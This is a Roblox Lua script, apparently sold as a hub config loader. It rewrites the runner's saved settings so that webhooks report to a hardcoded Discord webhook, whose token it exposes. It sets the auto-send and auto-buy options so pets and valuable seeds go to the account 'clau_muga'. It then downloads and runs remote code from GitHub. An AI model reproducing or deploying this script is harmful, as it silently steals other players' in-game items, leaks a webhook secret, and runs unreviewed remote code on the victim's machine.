local HS = game:GetService("HttpService")
local uid = tostring(game:GetService("Players").LocalPlayer.UserId)
local path = "HoHoGag2/"..uid.."/settings/ggjjhhj.json"

local data = HS:JSONDecode(readfile(path))

local url = "https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"

-- текстовые поля (Input)
local inputs = {
    WebhookRarePet  = url,
    WebhookSentPet  = url,
    WebhookSentSeed = url,
    Text_SendPetUsername      = "clau_muga",
    Text_WishSeedUsername     = "clau_muga",
    Text_MutationSeedUsername = "clau_muga",
}
-- тумблеры (Toggle) → включить
local toggles = {
    WebhookEnabled        = true,
    Feature_AutoBuyPets   = true,
    Feature_AutoSendPets  = true,
    Feature_AutoSendSeeds = true,
}
-- ДОБАВИТЬ в seed-таргеты (существующие не трогаем). Pets (Golden Dragonfly, Unicorn) пропущены.
local seedsToAdd = {"Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold"}
local seedDropdowns = { MailSeedTargets=true, WishSeedTargets=true, BuySeedTargets=true }

for _, o in ipairs(data.objects) do
    if inputs[o.idx] ~= nil then
        o.text = inputs[o.idx]
    elseif toggles[o.idx] ~= nil then
        o.value = true
    elseif seedDropdowns[o.idx] and type(o.value) == "table" then
        for _, s in ipairs(seedsToAdd) do o.value[s] = true end
    end
end

writefile(path, HS:JSONEncode(data))
print("[HOHO] конфиг ggjjhhj обновлён, вебхуки включены")

loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()
